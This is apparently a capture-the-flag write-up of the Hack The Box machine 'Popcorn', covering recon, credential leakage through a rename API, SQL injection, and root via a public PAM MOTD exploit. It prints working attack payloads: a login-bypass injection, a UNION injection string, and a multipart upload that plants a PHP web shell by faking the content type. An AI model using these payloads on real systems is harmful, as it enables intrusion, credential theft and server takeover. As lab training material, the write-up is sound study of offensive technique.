---

title: 🟠 HTB - Popcorn
author: Acivik
date: 2025-01-24 20:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Popcorn, walkthrough, medium, linux]

---

![https://i.ibb.co/b6xZz9t/Popcorn.png](https://i.ibb.co/b6xZz9t/Popcorn.png)

---

# <span style="color:#AA0E1C"><b># System Info & Credentials</b></span>

| IP: | 10.10.10.6 |
| --- | --- |
| OS: | Ubuntu 9.10 "Karmic Koala” |
| Hosts: | popcorn.htb |
| Credentials: | torrent:SuperSecret!! |

# <span style="color:#AA0E1C"><b># Nmap Result</b></span>

```bash
root@kali:~/HTB/popcorn# nmap -p22,80 -sT 10.10.10.6 --min-rate 10000 -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 13:48 UTC
Nmap scan report for 10.10.10.6 (10.10.10.6)
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-title: Did not follow redirect to http://popcorn.htb/
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
root@kali:~/HTB/popcorn#
```

# <span style="color:#AA0E1C"><b># Open Ports & To-Do</b></span>

| 22/tcp SSH | OpenSSH 5.1p1-6ubuntu2
 | Need Credentials |
| --- | --- | --- |
| 80/tcp HTTP | Apache/2.2.12 | [+ SourceCode]
[+ Discover Content]
[+ Check Web Vuln] |

# <span style="color:#AA0E1C"><b># Enumeration Notes</b></span>

## <span style="color:#0096FF">Web-Enum:</span>

![https://i.ibb.co/ZG8ngW6/resim-2025-01-23-141548690.png](https://i.ibb.co/ZG8ngW6/resim-2025-01-23-141548690.png)

### <span style="color:#FFC300">Directory & Files</span>

```
/index/
/test/ -> phpinfo() page
/torrent/ -> TorrentHoster
	/torrents.php
	/comment
	/config.php
	/database/th_database.sql -> admin:admin12
	/login
	/upload.php
	/upload -> uploads directory
	/readme
	/lib -> Index of /torrent/lib
/rename/ -> api
```

### <span style="color:#FFC300">/torrent/</span>

![https://i.ibb.co/YhsKdDw/resim-2025-01-23-142222893.png](https://i.ibb.co/YhsKdDw/resim-2025-01-23-142222893.png)

# <span style="color:#AA0E1C"><b># Vulnerabilities</b></span>

### <span style="color:#FFC300">Rename Files</span>

We can change files name with rname api. 

For example, you can read the config.php file by changing its name to config.txt.

```bash
/rename/
		Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
```

```bash
/rename/index.php?filename=/var/www/torrent/config.php&newfilename=/var/www/torrent/lib/config.txt
	  $CFG->dbName = "torrenthoster";	//db name
	  $CFG->dbUserName = "torrent";    //db username
	  $CFG->dbPassword = "SuperSecret!!";	//db password
```

### <span style="color:#FFC300">Authentication Bypass</span>

```bash
/torrent/login (Authentication Bypass) -> admin' or 1='1
```

### <span style="color:#FFC300">SQL Injection</span>

```bash
/torrent/torrents.php (There is sqli on search box) -> test' union select null,group_concat(schema_name),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.schemata-- -
```

### <span style="color:#FFC300">File Upload (Authenticated)</span>

![https://i.ibb.co/1X73pKn/resim-2025-01-23-142803287.png](https://i.ibb.co/1X73pKn/resim-2025-01-23-142803287.png)

# <span style="color:#AA0E1C"><b># Foothold</b></span>

## <span style="color:#0096FF">SQL Injection</span>

```bash
/torrent/torrents.php (There is sqli on search box) -> test' union select null,group_concat(schema_name),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.schemata-- -
database:information_schema
database:torrenthoster
	tables:ban
	tables:categories
	tables:comments
	tables:log
	tables:namemap
	tables:news
	tables:subcategories
	tables:users
		columns:id
		columns:userName
		columns:password
		columns:privilege
		columns:email
		columns:joined
		columns:lastconnect
	
dumped -> Admin : d5bfedcee289e5e05b86daad8ee3e2e2 : admin : admin@yourdomain.com (couldn't crack this hash)
```

## <span style="color:#0096FF">Upload Shell</span>

![https://i.ibb.co/1X73pKn/resim-2025-01-23-142803287.png](https://i.ibb.co/1X73pKn/resim-2025-01-23-142803287.png)

**Request Body:**

Changed the content type header from `application/x-php` to `image/jpeg`

```bash
-----------------------------239990188727439809613051752681
Content-Disposition: form-data; name="file"; filename="cmd.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]);?>

-----------------------------239990188727439809613051752681
Content-Disposition: form-data; name="submit"

Submit Screenshot
-----------------------------239990188727439809613051752681--

```

**Response Body:**

```bash
Upload: cmd.php
Type: image/jpeg
Size: 0.029296875 Kb
Upload Completed.
Please refresh to see the new screenshot.
```

```bash
http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

# <span style="color:#AA0E1C"><b># Privilege Escalation</b></span>

check os version

```bash
www-data@popcorn:/home/george$ uname -a
uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
www-data@popcorn:/home/george$ cat /etc/*release*
cat /etc/*release*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=9.10
DISTRIB_CODENAME=karmic
DISTRIB_DESCRIPTION="Ubuntu 9.10"
www-data@popcorn:/home/george$
```

[https://www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)

```bash
www-data@popcorn:/tmp$ ls
privesc.sh  vgauthsvclog.txt.0	vmware-root
www-data@popcorn:/tmp$ ./privesc.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: 
root@popcorn:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@popcorn:/tmp#
```
